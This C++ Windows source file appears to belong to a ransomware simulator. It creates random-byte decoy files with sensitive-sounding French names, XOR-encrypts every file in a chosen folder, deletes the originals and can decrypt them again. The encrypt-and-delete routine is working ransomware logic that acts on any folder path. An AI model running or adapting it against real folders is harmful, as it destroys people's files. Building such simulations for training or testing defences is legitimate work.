#include "pch.h"
#include "utils.h"
namespace fs = std::filesystem;
std::wstring GetCurrentUsername()
{
    char* username = nullptr;
    size_t len = 0;

    // Use _dupenv_s to safely retrieve the environment variable
    if (_dupenv_s(&username, &len, "USERNAME") == 0 && username != nullptr)
    {
        std::string name(username);
        free(username); // Free the allocated memory
        return std::wstring(name.begin(), name.end());
    }

    return L"user";
}
void CreateFolderIfNotExists(const std::wstring& folderPath)
{
    CreateDirectoryW(folderPath.c_str(), NULL);
}

std::wstring GenerateRealisticFilename(const std::wstring& ext, const std::wstring& username)
{
    static std::random_device rd;
    static std::mt19937 gen(rd());

    std::vector<std::wstring> txtNames = {
        L"notes", L"login_backup", L"mdp", L"meeting", L"projet"
    };
    std::vector<std::wstring> pdfNames = {
        L"contrat", L"convention_stage", L"fiche_de_paie", L"attestation_travail"
    };
    std::vector<std::wstring> jpgNames = {
        L"photo_" + username, L"carte_vitale", L"qr_code", L"plan_site", L"carte_nationale", L""
    };
    std::vector<std::wstring> xlsxNames = {
        L"facture", L"rapport_hebdo", L"budgets", L"notes_frais"
    };

    std::vector<std::wstring>* namePool = nullptr;

    if (ext == L".txt") namePool = &txtNames;
    else if (ext == L".pdf") namePool = &pdfNames;
    else if (ext == L".jpg") namePool = &jpgNames;
    else if (ext == L".xlsx") namePool = &xlsxNames;

    if (namePool && !namePool->empty())
    {
        std::uniform_int_distribution<> dist(0, static_cast<int>(namePool->size() - 1));
        return (*namePool)[dist(gen)] + ext;
    }

    return L"fichier" + ext;
}

void GenerateDummyFiles(const std::wstring& folderPath, int countPerType)
{
    CreateFolderIfNotExists(folderPath);

    std::wstring extensions[] = { L".txt", L".pdf", L".jpg", L".xlsx" };
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> distSize(1024, 10240);
    std::uniform_int_distribution<> suffix(1000, 9999);

    std::wstring username = GetCurrentUsername();

    for (const auto& ext : extensions)
    {
        for (int i = 0; i < countPerType; ++i)
        {
            std::wstring baseName = GenerateRealisticFilename(ext, username);
            std::wstring filename = folderPath + L"\\" + baseName;

            // Ajouter un suffixe pour éviter les doublons
            filename.insert(filename.find_last_of(L'.'), L"_" + std::to_wstring(suffix(gen)));

            std::ofstream file(filename, std::ios::binary);
            int fileSize = distSize(gen);

            for (int j = 0; j < fileSize; ++j)
            {
                char byte = static_cast<char>(rand() % 256);
                file.write(&byte, 1);
            }

            file.close();
        }
    }
}

void ProcessFile(const std::wstring& inPath, const std::wstring& outPath, const std::string& key) {
    std::ifstream inFile(inPath, std::ios::binary);
    if (!inFile) return;

    std::vector<char> buffer((std::istreambuf_iterator<char>(inFile)), std::istreambuf_iterator<char>());
    inFile.close();

    for (size_t i = 0; i < buffer.size(); ++i) {
        buffer[i] ^= key[i % key.size()] ^ (char)(i % 251);  // simple XOR maison
    }

    std::ofstream outFile(outPath, std::ios::binary);
    outFile.write(buffer.data(), buffer.size());
    outFile.close();
}

void EncryptAllFilesInFolder(const std::wstring& folderPath, const std::string& key) {
    for (const auto& entry : fs::directory_iterator(folderPath)) {
        if (entry.is_regular_file()) {
            std::wstring original = entry.path();
            std::wstring encrypted = original + L".enc";

            ProcessFile(original, encrypted, key);
            DeleteFileW(original.c_str());
        }
    }
}

void DecryptAllFilesInFolder(const std::wstring& folderPath, const std::string& key) {
    for (const auto& entry : fs::directory_iterator(folderPath)) {
        if (entry.is_regular_file() && entry.path().extension() == L".enc") {
            std::wstring encrypted = entry.path();
            std::wstring original = encrypted.substr(0, encrypted.length() - 4); // retirer ".enc"

            ProcessFile(encrypted, original, key);
            DeleteFileW(encrypted.c_str());
        }
    }
}